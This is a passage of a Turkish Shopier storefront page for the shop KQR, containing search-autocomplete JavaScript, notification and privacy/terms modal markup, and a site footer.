                        searchBody.classList.remove('show');
                    }
                });

                searchButton?.addEventListener("click", function () {
                    if (sessionStorage.getItem("searchParams") !== null) {
                        searchInput.value = sessionStorage.getItem("searchParams");
                        createList(searchInput.value);
                    }
                });
            });
        });



        function getSearchResults(input) {
            const search_value = input.value;
            if (search_value.length >= 3) {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', endpoint, true);
                xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xhr.responseType = 'json';
                xhr.onreadystatechange = function () {
                    if (parseInt(xhr.readyState) === 4 && parseInt(xhr.status) === 200) {
                        let json = xhr.response;
                        createList(json);
                        last_query = search_value;
                    }
                };
                xhr.send('search_query=' + search_value + '&username=' + searchShopName + '&search_as_you_type=true&highlight=');
            } else {
                searchBody.style.display = "none";
                searchBody.classList.remove("showing-results");
                searchBody.classList.remove("show");
            }
        }

        function createList(json) {
            if (typeof (json) === 'string' && json) {
                json = JSON.parse(json);
            }

            if (!json) {
                return;
            }

            if (json.status === false || typeof (json) !== 'object') {
                return;
            }

            last_results = json;
            const shingles = json.suggestions.shingles;
            const categories = json.suggestions.categories;
            const products = json.hits;

            if (json.nHits === 0 && shingles.length === 0 && categories.length === 0 && products.length === 0) {
                return;
            }

            searchResults.innerHTML = "";
            const suggestionClicked = false;
            if (suggestionClicked === false) {
                shingles.forEach(function (shingle) {
                    const shingle_li = createListElementForSearch(shingle, "&#8203;", function () {
                        searchInput.value = shingle.replace(/<\/?[^>]+(>|$)/g, "");
                        if (!hasMobile) {
                            store.search_value = searchInput.value;
                            searchprocess(store.default_product_count, 'shopier-es--input', store, '', 'store');
                                                        searchForm.submit();
                                                    }else{
                            canvas.search_value = searchInput.value;
                            searchprocess(canvas.default_product_count, 'shopier-es--input-mobile', canvas, '-canvas', 'canvas');
                        }
                        searchBody.style.display = "none";
                        searchBody.classList.remove("showing-results");
                        searchBody.classList.remove("show");
                    });
                    if (shingle_li !== null && shingle_li !== undefined){
                        searchResults.appendChild(shingle_li);
                    }
                });

                categories.forEach(function (category) {
                    let category_name = category.suggestion;
                    let clean_category_name = category.clean_name;

                    const category_li = createListElementForSearch(category_name, "Kategori", function () {
                        if (!hasMobile){
                            let path = window.location.pathname;
                            let page = path.split("/").pop();
                            window.location.href = "https://www.shopier.com/" + searchShopName + "#" + encodeURIComponent(clean_category_name);
                                                    } else{
                            const modifiedCategoryId = 'cat_' + category.category_id;
                            canvas.search_value = '';
                            canvas.checkboxes = [];
                            canvas.checkboxes.push(modifiedCategoryId);
                            setTimeout("sendFilterInfo(canvas, '-canvas', 'canvas')", 1);
                            setDotVisibility(true, '.filter-dot-canvas .input-filter-dot-canvas');
                            resetCategoryCheckboxes('-canvas');
                            fetchActiveCheckboxes(canvas, '-canvas', 'canvas');
                            searchBody.style.display = "none";
                            searchBody.classList.remove("showing-results");
                            searchBody.classList.remove("show");
                        }
                    });
                    searchResults.appendChild(category_li);
                });

            }

            products.forEach(function (product) {
                if (product.subject.length > 0) {
                    const product_li = createListElementForSearch(product.subject, "Ürün", function () {
                        const search_query = searchInput.value;
                        let xhr = new XMLHttpRequest();
                        xhr.open('POST', endpoint, false);
                        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                        xhr.send('click=1&username=' + searchShopName + '&search_query=' + search_query + '&product_id=' + product.product_id);
                        window.location.href = "https://www.shopier.com/" + product.product_id;
                    });

                    searchResults.appendChild(product_li);
                }
            });
            searchBody.style.display = "block";
            searchBody.classList.add("showing-results");
            searchBody.classList.add('show');
        }
        function normalizeTurkishChars(text) {
            const doc = new DOMParser().parseFromString(text, 'text/html');
            text = doc.body.textContent || "";
            const charMap = {
                'ç': 'c', 'Ç': 'C',
                'ğ': 'g', 'Ğ': 'G',
                'ı': 'i', 'I': 'I',
                'İ': 'i', 'ş': 's',
                'Ş': 'S', 'ö': 'o',
                'Ö': 'O', 'ü': 'u',
                'Ü': 'U',
                "'": "'",
            };
            return text.replace(/[çÇğĞıİşŞöÖüÜ']/g, function(match) {
                return charMap[match] || match;
            });
        }


        function cleanText(text) {
            return text.replace(/[^\w\s&'"-]/g, '').replace(/\s+/g, '').trim();
        }

        function createListElementForSearch(elementText, type = null, onClickFunction) {
            const input = searchInput.value;
            const searchTerm = normalizeTurkishChars(input.trim().toLowerCase());
            const searchTerm2 = cleanText(searchTerm);
            const normalizedElementText = normalizeTurkishChars(elementText.trim().toLowerCase());
            const normalizedElementText2 = cleanText(normalizedElementText);
            let highlightedText = elementText;
            if (normalizedElementText2.includes(searchTerm2) && searchTerm2 !== "") {
                let startIndex = normalizedElementText.indexOf(searchTerm);
                let endIndex = startIndex + searchTerm.length;

                if (startIndex !== -1) {
                    highlightedText = highlightedText.substring(0, startIndex) +
                        `<span class="search-match">${highlightedText.substring(startIndex, endIndex)}</span>` +
                        highlightedText.substring(endIndex);
                }
            }
            if (highlightedText !== ''){
                const li = document.createElement("li");
                const searchItem = document.createElement('div');
                const searchLink = document.createElement('a');

                li.classList.add("shopier-es--result");
                li.addEventListener("click", onClickFunction);

                searchLink.classList.add('dropdown-item');
                searchItem.classList.add('search-item');

                li.appendChild(searchLink);
                searchLink.appendChild(searchItem);

                const textSpan = document.createElement("div");
                textSpan.innerHTML = highlightedText;
                textSpan.classList.add("shopier-es--result-name", "search-term");

                let typeSpan;
                if (type) {
                    typeSpan = document.createElement("div");
                    typeSpan.innerHTML = type;
                    typeSpan.classList.add("shopier-es--result-category", "search-category");
                }

                searchItem.appendChild(textSpan);
                if (type && typeSpan !== undefined) {
                    searchItem.appendChild(typeSpan);
                }
                return li;
            }
        }

    }
</script><script>

    // function handleHttpError(status) {
      //  let errorMessage;
       // switch (status) {
        //    case 404:
          //      errorMessage = "Geçersiz bir istek gönderildi, lütfen bir süre sonra tekrar deneyiniz.";
            //    break;
            //case 500:
              //  errorMessage = "Sunucudan yanıt alınamadı, lütfen bir süre sonra tekrar deneyiniz.";
                //break;
            //default:
              //  errorMessage = "Beklenmeyen bir hata oluştu, lütfen bir süre sonra tekrar deneyiniz.";
        //}
        //showInvalidModal({message: errorMessage});
    //}
    function createModalOrCanvas() {
        document.querySelectorAll('.toast')?.forEach(toast => toast.remove());
        const canvasHTML = `
        <div class="offcanvas offcanvas-bottom action-sheet notification-canvas toast" tabindex="-1" id="invalid-canvas"
     aria-labelledby="notification-canvasLabel">
    <div class="offcanvas-header"><button class="hidden" type="button" data-bs-dismiss="offcanvas"
                                          aria-label="Close"></button>
        <div class="action-sheet-swipe-btn"></div>
    </div>
    <div class="offcanvas-body toast-body">
        <div class="action-sheet-desc">
            <div class="notification-icon icon-container">
                <div class="bg-miscallenous"></div>
            </div>
            <div class="notification-title toast-title"></div>
            <div class="notification-description-center toast-text"></div>
        </div>
    </div>
    <div class="offcanvas-footer toast-btn">
        <div class="action-sheet-footer toast-btn"><button class="btn btn-primary w-full" type="button"
                                                 data-bs-dismiss="offcanvas"><span>Tamam</span></button>
        </div>
    </div>
</div>`;
        const modalHTML = `
        <div class="modal fade notification-modal toast" id="invalid-modal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body toast-body">
                <div class="notification-icon icon-container">
                    <div class="bg-miscallaneous"></div>
                </div>
                <div class="notification-title toast-title"></div>
                <div class="notification-description-center toast-text"></div>
            </div>
            <div class="modal-footer toast-btn"><button class="btn btn-primary w-full" type="button"
                                              data-bs-dismiss="modal"><span>Tamam</span></button></div>
        </div>
    </div>
</div>`;
        const footer = document.querySelector('footer');
        if (footer) {
            const selectedHTML = isMobileView ? canvasHTML : modalHTML;
            footer.insertAdjacentHTML('beforebegin', selectedHTML);
        }
    }


</script>
        <div class="offcanvas offcanvas-bottom action-sheet notification-canvas toast" tabindex="-1" id="invalid-canvas" aria-labelledby="notification-canvasLabel" bis_skin_checked="1">
    <div class="offcanvas-header" bis_skin_checked="1"><button class="hidden" type="button" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        <div class="action-sheet-swipe-btn" bis_skin_checked="1"></div>
    </div>
    <div class="offcanvas-body toast-body" style="" bis_skin_checked="1">
        <div class="action-sheet-desc" bis_skin_checked="1">
            <div class="notification-icon icon-container" bis_skin_checked="1">
                <div class="bg-miscallenous" bis_skin_checked="1"></div>
            </div>
            <div class="notification-title toast-title" bis_skin_checked="1"></div>
            <div class="notification-description-center toast-text" bis_skin_checked="1"></div>
        </div>
    </div>
    <div class="offcanvas-footer toast-btn" style="border-top-width: 0px;" bis_skin_checked="1">
        <div class="action-sheet-footer toast-btn" bis_skin_checked="1"><button class="btn btn-primary w-full" type="button" data-bs-dismiss="offcanvas"><span>Tamam</span></button>
        </div>
    </div>
</div>
    <div class="offcanvas offcanvas-bottom action-sheet privacy-and-terms-canvas" tabindex="-1" id="privacy-and-terms-sheet" aria-labelledby="privacy-and-terms-sheetLabel" bis_skin_checked="1">
        <div class="offcanvas-header" bis_skin_checked="1">
            <button class="hidden" type="button" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            <div class="action-sheet-swipe-btn" bis_skin_checked="1"></div>
        </div>
        <div class="offcanvas-body" style="" bis_skin_checked="1">
            <div class="action-sheet-desc" bis_skin_checked="1">
                <div class="flex justify-center font-semibold text-[20px]" bis_skin_checked="1">Gizlilik ve Koşullar</div>
                <div class="mt-[40px]" bis_skin_checked="1">
                    <div class="flex align-center justify-between pb-[14px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="offcanvas" data-bs-target="#shopping-safety-sheet" id="shopping_security" aria-controls="shopping-safety-sheet" bis_skin_checked="1">
                        <div class="font-normal text-start text-16 pt-1" bis_skin_checked="1">Alışveriş Güvenliği</div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                    <div class="flex align-center justify-between pt-[11px] pb-[14px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="offcanvas" id="pre_information" aria-controls="pre-information-form-sheet" bis_skin_checked="1">
                        <div class="font-normal text-start text-16 pt-1" bis_skin_checked="1">Ön Bilgilendirme Formu </div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                    <div class="flex align-center justify-between pt-[11px] pb-[14px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="offcanvas" id="distance_sale" aria-controls="distance-sales-agreement-sheet" bis_skin_checked="1">
                        <div class="font-normal text-start text-16 pt-1" bis_skin_checked="1">Mesafeli Satış Sözleşmesi</div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                    <div class="flex align-center justify-between pt-[11px] pb-[14px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="offcanvas" id="personal_data" aria-controls="personal-data-protection-sheet" bis_skin_checked="1">
                        <div class="font-normal text-start text-16 pt-1" bis_skin_checked="1">Kişisel Verilerin Korunması</div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                    <div class="flex align-center justify-between pt-[11px] cursor-pointer mb-[210px]" data-bs-toggle="offcanvas" id="refund" aria-controls="return-terms-sheet" bis_skin_checked="1">
                        <div class="font-normal text-start text-16 pt-1" bis_skin_checked="1">İade Koşulları</div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                </div>
            </div>
        </div>
        <div class="offcanvas-footer" style="border-top-width: 0px;" bis_skin_checked="1">
            <div class="action-sheet-footer" bis_skin_checked="1">
                <button class="btn btn-primary w-full" type="button" data-bs-dismiss="offcanvas">
                    <span>Kapat</span></button>
            </div>
        </div>
    </div>
<div class="offcanvas offcanvas-bottom action-sheet privacy-and-terms-2-canvas secure_toast" id="secure_canvas" tabindex="-1" aria-labelledby="shopping-safety-sheetLabel" bis_skin_checked="1">
    <div class="offcanvas-header" bis_skin_checked="1">
        <button class="hidden" type="button" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        <div class="action-sheet-swipe-btn" bis_skin_checked="1"></div>
    </div>
    <div class="offcanvas-body" style="" bis_skin_checked="1">
        <div class="scroll-effect" bis_skin_checked="1"></div>
        <div class="action-sheet-desc" bis_skin_checked="1">
            <div class="flex justify-center font-semibold text-[20px] relative" bis_skin_checked="1">
                <svg class="absolute left-0 top-0" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-bs-toggle="offcanvas" data-bs-target="#privacy-and-terms-sheet" aria-controls="privacy-and-terms-sheet">
                    <path d="M15.0003 20.67C14.8103 20.67 14.6203 20.6 14.4703 20.45L7.95027 13.93C6.89027 12.87 6.89027 11.13 7.95027 10.07L14.4703 3.55002C14.7603 3.26002 15.2403 3.26002 15.5303 3.55002C15.8203 3.84002 15.8203 4.32002 15.5303 4.61002L9.01027 11.13C8.53027 11.61 8.53027 12.39 9.01027 12.87L15.5303 19.39C15.8203 19.68 15.8203 20.16 15.5303 20.45C15.3803 20.59 15.1903 20.67 15.0003 20.67Z" fill="currentColor"></path>
                </svg>
                <span class="mr-[19px] toast-title"></span>
            </div>
            <div class="mt-[29px] max-h-[468px] overflow-y-auto scrollable-content privacy-and-terms-content-sheet-scroll" bis_skin_checked="1">
                <div class="relative privacy-and-terms-content-sheet pr-[19px]" bis_skin_checked="1">
                    <div class="font-normal text-start text-15 leading-[18px] toast-text" bis_skin_checked="1"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="offcanvas-footer" style="border-top-width: 0px;" bis_skin_checked="1">
        <div class="action-sheet-footer" bis_skin_checked="1">
            <button class="btn btn-primary w-full" type="button" data-bs-toggle="offcanvas" data-bs-target="#privacy-and-terms-sheet" aria-controls="privacy-and-terms-sheet">
                <span>Kapat</span>
            </button>
        </div>
    </div>
</div><footer class="footer footer-primary">
    <div class="flex flex-col" bis_skin_checked="1">
        <div class="order-track-btn-sheet flex justify-center items-center border-b border-[#E2E2E5] pt-[34px] pb-[29px] lg:hidden" bis_skin_checked="1">
            <div class="flex justify-center items-center" bis_skin_checked="1">
                <div class="text-14 font-medium text-[#0B0F34] text-center cursor-pointer" data-bs-toggle="offcanvas" data-bs-target="#orderTrackingSheet" bis_skin_checked="1">Sipariş takibi</div>
            </div>
        </div>
        <div class="flex justify-center" bis_skin_checked="1">
            <div class="container" bis_skin_checked="1">
                                    <div class="footer-content general-footer" bis_skin_checked="1">
                        <div class="footer-description" bis_skin_checked="1">
                            <div class="footer-title" bis_skin_checked="1">
                                                                    KQR
                                                            </div>
                            <p class="footer-message"></p>
                                                        <button class="btn-follow order-track-btn-modal download-app hidden lg:flex;" data-bs-toggle="modal" data-bs-target="#orderTrackingModal">
                                <span>Sipariş takibi </span>
                            </button>
                        </div>
                        <div class="footer-links" bis_skin_checked="1">
                            <div class="footer-title" bis_skin_checked="1">Koşullar</div>
                            <ul class="footer-links-list">
                                <li class="footer-section__menu-item">
                                    <div id="open-shopping-secure-modal" class="footer-section__menu-link" bis_skin_checked="1">Alışveriş Güvenliği</div>
                                </li>
                                <li class="footer-section__menu-item">
                                    <div id="open-preliminary-information-form-modal" class="footer-section__menu-link" bis_skin_checked="1">Ön Bilgilendirme Formu </div>
                                </li>
                                <li class="footer-section__menu-item">
                                    <div id="open-distance-selling-contract-modal" class="footer-section__menu-link" bis_skin_checked="1">Mesafeli Satış Sözleşmesi</div>
                                </li>
                                <li class="footer-section__menu-item">
                                    <div id="open-protection-of-personal-data-modal" class="footer-section__menu-link" bis_skin_checked="1">Kişisel Verilerin Korunması</div>
                                </li>
                            </ul>
                        </div>
                    </div>
                
                <div class="footer-content checkout-footer" bis_skin_checked="1">
                    <div class="footer-description" bis_skin_checked="1">
                        <div class="flex items-center justify-center gap-x-[15px]" bis_skin_checked="1">
                            <svg class="footer-icon" width="35" height="34" viewBox="0 0 35 34" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5 0C26.8825 0 34.5 7.61746 34.5 17C34.5 26.3825 26.8825 34 17.5 34C8.11746 34 0.5 26.3825 0.5 17C0.5 7.61746 8.11746 0 17.5 0ZM17.5 6.375C14.6144 6.375 14.2526 6.38722 13.1193 6.43895C11.9884 6.49055 11.216 6.67018 10.5402 6.93281C9.8415 7.20435 9.24896 7.56766 8.65827 8.15834C8.06759 8.74902 7.70428 9.34157 7.43275 10.0402C7.17011 10.716 6.99055 11.4884 6.93888 12.6193C6.88722 13.7526 6.875 14.1144 6.875 17C6.875 19.8856 6.88722 20.2474 6.93888 21.3807C6.99055 22.5116 7.17011 23.284 7.43275 23.9598C7.70428 24.6584 8.06759 25.251 8.65827 25.8417C9.24896 26.4324 9.8415 26.7957 10.5402 27.0673C11.216 27.3298 11.9884 27.5095 13.1193 27.5611C14.2526 27.6128 14.6144 27.625 17.5 27.625C20.3856 27.625 20.7474 27.6128 21.8807 27.5611C23.0116 27.5095 23.784 27.3298 24.4598 27.0673C25.1584 26.7957 25.751 26.4324 26.3417 25.8417C26.9324 25.251 27.2957 24.6584 27.5673 23.9598C27.8298 23.284 28.0095 22.5116 28.0611 21.3807C28.1128 20.2474 28.125 19.8856 28.125 17C28.125 14.1144 28.1128 13.7526 28.0611 12.6193C28.0095 11.4884 27.8298 10.716 27.5673 10.0402C27.2957 9.34157 26.9324 8.74902 26.3417 8.15834C25.751 7.56766 25.1584 7.20435 24.4598 6.93281C23.784 6.67018 23.0116 6.49055 21.8807 6.43895C20.7474 6.38722 20.3856 6.375 17.5 6.375ZM17.4996 8.28906C20.3366 8.28906 20.6727 8.29989 21.7931 8.35102C22.829 8.3983 23.3915 8.57136 23.7659 8.71685C24.2619 8.90956 24.6159 9.13986 24.9876 9.51167C25.3595 9.88341 25.5897 10.2374 25.7824 10.7333C25.9279 11.1077 26.101 11.6703 26.1483 12.7062C26.1994 13.8266 26.2102 14.1626 26.2102 16.9996C26.2102 19.8366 26.1994 20.1727 26.1483 21.2931C26.101 22.329 25.9279 22.8915 25.7824 23.2659C25.5897 23.7619 25.3595 24.1159 24.9876 24.4876C24.6159 24.8595 24.2619 25.0897 23.7659 25.2824C23.3915 25.4279 22.829 25.601 21.7931 25.6483C20.6729 25.6994 20.3368 25.7102 17.4996 25.7102C14.6624 25.7102 14.3265 25.6994 13.2062 25.6483C12.1703 25.601 11.6077 25.4279 11.2333 25.2824C10.7374 25.0897 10.3834 24.8595 10.0116 24.4876C9.63979 24.1159 9.40956 23.7619 9.21685 23.2659C9.07136 22.8915 8.89823 22.329 8.85095 21.2931C8.79982 20.1727 8.78906 19.8366 8.78906 16.9996C8.78906 14.1626 8.79982 13.8266 8.85095 12.7062C8.89823 11.6703 9.07136 11.1077 9.21685 10.7333C9.40956 10.2374 9.63979 9.88341 10.0116 9.51167C10.3834 9.13986 10.7374 8.90956 11.2333 8.71685C11.6077 8.57136 12.1703 8.3983 13.2062 8.35102C14.3266 8.29989 14.6626 8.28906 17.4996 8.28906ZM17.499 11.5439C14.4857 11.5439 12.043 13.9867 12.043 17C12.043 20.0133 14.4857 22.4561 17.499 22.4561C20.5124 22.4561 22.9551 20.0133 22.9551 17C22.9551 13.9867 20.5124 11.5439 17.499 11.5439ZM17.4987 20.5413C15.5427 20.5413 13.957 18.9556 13.957 16.9997C13.957 15.0437 15.5427 13.458 17.4987 13.458C19.4547 13.458 21.0403 15.0437 21.0403 16.9997C21.0403 18.9556 19.4547 20.5413 17.4987 20.5413ZM24.4484 11.3287C24.4484 12.0329 23.8775 12.6036 23.1734 12.6036C22.4693 12.6036 21.8984 12.0329 21.8984 11.3287C21.8984 10.6245 22.4693 10.0537 23.1734 10.0537C23.8775 10.0537 24.4484 10.6245 24.4484 11.3287Z" fill="#292D32"></path>
                            </svg>
                            <svg class="footer-icon" width="35" height="34" viewBox="0 0 35 34" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <circle cx="17.5" cy="17" r="17" fill="#292D32"></circle>
                                <g clip-path="url(#clip0_6366_51692)">
                                    <path d="M12.689 13.79H9.07548C8.9151 13.79 8.78516 13.92 8.78516 14.0804V25.6891C8.78516 25.8495 8.9151 25.9794 9.07548 25.9794H12.689C12.8494 25.9794 12.9793 25.8495 12.9793 25.6891V14.0804C12.9793 13.92 12.8494 13.79 12.689 13.79Z" fill="#F7F7F7"></path>
                                    <path d="M10.8845 8.01953C9.56967 8.01953 8.5 9.08803 8.5 10.4014C8.5 11.7153 9.56967 12.7842 10.8845 12.7842C12.1982 12.7842 13.267 11.7153 13.267 10.4014C13.2671 9.08803 12.1982 8.01953 10.8845 8.01953Z" fill="#F7F7F7"></path>
                                    <path d="M21.8802 13.502C20.4289 13.502 19.356 14.1259 18.7053 14.8348V14.0808C18.7053 13.9205 18.5753 13.7905 18.415 13.7905H14.9544C14.794 13.7905 14.6641 13.9205 14.6641 14.0808V25.6895C14.6641 25.8499 14.794 25.9798 14.9544 25.9798H18.56C18.7204 25.9798 18.8503 25.8499 18.8503 25.6895V19.9459C18.8503 18.0104 19.3761 17.2564 20.7252 17.2564C22.1946 17.2564 22.3114 18.4652 22.3114 20.0455V25.6896C22.3114 25.8499 22.4413 25.9799 22.6017 25.9799H26.2087C26.3691 25.9799 26.499 25.8499 26.499 25.6896V19.322C26.499 16.444 25.9502 13.502 21.8802 13.502Z" fill="#F7F7F7"></path>
                                </g>
                                <defs>
                                    <clipPath id="clip0_6366_51692">
                                        <rect width="18" height="18" fill="white" transform="translate(8.5 8)"></rect>
                                    </clipPath>
                                </defs>
                            </svg>
                        </div>
                        <div class="footer-title cursor-pointer privacy-and-terms-content-modal-btn" data-bs-toggle="modal" data-bs-target="#privacy-and-terms-modal" bis_skin_checked="1">Gizlilik ve Koşullar</div>
                        <div class="footer-title cursor-pointer privacy-and-terms-content-sheet-btn" data-bs-toggle="offcanvas" data-bs-target="#privacy-and-terms-sheet" bis_skin_checked="1">Gizlilik ve Koşullar</div>
                        <p class="footer-message-checkout">Copyright © 2025 Shopier</p>
                        <p class="footer-message-checkout">Tüm hakları saklıdır.</p>
                    </div>
                </div>

            </div>
        </div>
    </div>
</footer>
    <template id="desktop_privacy_template">
    <div class="modal fade modal-privacy-and-terms" id="privacy-and-terms-modal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="flex justify-center mt-[27px] font-semibold text-[20px]">Gizlilik ve Koşullar</div>
                    <div class="mt-[84px]">
                        <div class="flex align-center justify-between pb-[22px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="modal" id="shopping_security">
                            <div class="font-normal text-start text-16 pt-1">Alışveriş Güvenliği</div>
                            <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                            </svg>
                        </div>
                        <div class="flex align-center justify-between pt-[24px] pb-[22px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="modal" id="pre_information">
                            <div class="font-normal text-start text-16 pt-1">Ön Bilgilendirme Formu </div>
                            <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                            </svg>
                        </div>
                        <div class="flex align-center justify-between pt-[24px] pb-[22px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="modal" id="distance_sale">
                            <div class="font-normal text-start text-16 pt-1">Mesafeli Satış Sözleşmesi</div>
                            <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                            </svg>
                        </div>
                        <div class="flex align-center justify-between pt-[24px] pb-[22px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="modal" id="personal_data">
                            <div class="font-normal text-start text-16 pt-1">Kişisel Verilerin Korunması</div>
                            <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                            </svg>
                        </div>
                        <div class="flex align-center justify-between pt-[24px] cursor-pointer" data-bs-toggle="modal" id="refund">
                            <div class="font-normal text-start text-16 pt-1">İade Koşulları</div>
